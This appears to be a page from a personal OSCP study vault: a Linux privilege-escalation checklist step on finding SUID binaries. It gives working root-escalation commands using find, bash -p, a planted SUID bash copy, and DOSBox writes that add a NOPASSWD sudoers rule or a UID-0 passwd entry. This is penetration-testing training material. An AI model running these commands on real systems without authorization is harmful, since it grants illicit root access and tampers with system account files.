# Linux - SUID Check

**Step 15 of 50 · Linux**

*Find programs that run with the file owner's privileges and check them for an escape.*

## Run this

> **Why:** This searches the filesystem for SUID programs, which run with their owner’s privileges and may provide a controlled escalation path.
```bash
find / -perm -4000 2>/dev/null
```

## Example output

```

/usr/bin/passwd
/usr/bin/find
/opt/custom-helper
...
```
## What did you get?

- [ ] A known exploitable SUID binary is found → **Open its GTFOBins entry, copy the matching command, run it once, and run `id` to confirm the result**
- [ ] `/usr/bin/find` is SUID → **`/usr/bin/find . -exec /bin/bash -p \; -quit`**
- [ ] `/bin/bash` is SUID → **`/bin/bash -p`**
- [ ] A SUID binary was created by a previous step (e.g. `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`) → **`/tmp/rootbash -p`**
- [ ] `dosbox` is SUID → **Mount `/etc` as a DOSBox drive and overwrite `sudoers`: `dosbox -c 'mount c /etc' -c 'echo username ALL=(ALL) NOPASSWD: ALL >> c:\sudoers' -c exit`**
- [ ] A custom SUID binary is found → **Run `strings $SuidPath` and `ltrace $SuidPath`, save the output, then go to Step 10 · [[Linux - Exploit Search]]**
- [ ] No useful SUID binary is found → **Go to Step 16 · [[Linux - Cron Check]]**

## Notes

SUID means the program runs with the owner's permissions, often root. GTFOBins lists confirmed escape paths for standard binaries.

The `-p` flag on bash preserves the effective UID — without it, bash drops the SUID privilege.

## Gotcha

> [!warning] 💡
> Do not assume every SUID result is exploitable. Check ownership, version, and how it is invoked.

> [!warning] 💡
> If you write to `/etc/sudoers` via DOSBox or any other method, always verify the file is still valid after the edit — a syntax error in sudoers locks out all sudo access on the box. Run `visudo -c` or check `sudo -l` immediately.

## DOSBox SUID file-write path

Use this branch when `/usr/bin/dosbox` is SUID root. DOSBox is a DOS emulator; its startup `-c` commands can mount a Linux directory and redirect output into a file with the emulator’s effective privileges.

> **Why:** This command mounts `/etc` as a DOS drive and writes a temporary sudoers rule through DOSBox; success is a valid rule visible to `sudo -l`.
```bash
# The shell expands the controlled username locally before DOSBox writes the rule.
dosbox -c 'mount c /etc' -c "echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers" -c 'exit'
sudo -l
```

> **Why:** This alternative writes a controlled root-equivalent `/etc/passwd` entry through the same SUID emulator; use it only when restoring sudoers is not the chosen path.
```bash
# Use the controlled username and a generated hash privately; do not paste credentials into notes.
dosbox -c 'mount c /etc' -c "echo $Username:x:0:0:root:/root:/bin/bash >> c:\passwd" -c 'exit'
```

## Additional routing

- [ ] The temporary sudoers rule is accepted → **Run the permitted root shell, restore the original sudoers, and go to Linux clean-down**
- [ ] DOSBox is SUID but file writes fail → **Check its version and invocation, then return to Step 10 · [[Linux - Exploit Search]]**
- [ ] No useful SUID path exists → **Go to Step 16 · [[Linux - Cron Check]]**
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/6. Pebbles|Pebbles]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/9. Nukem|Nukem]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/7. Nibbles|Nibbles]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
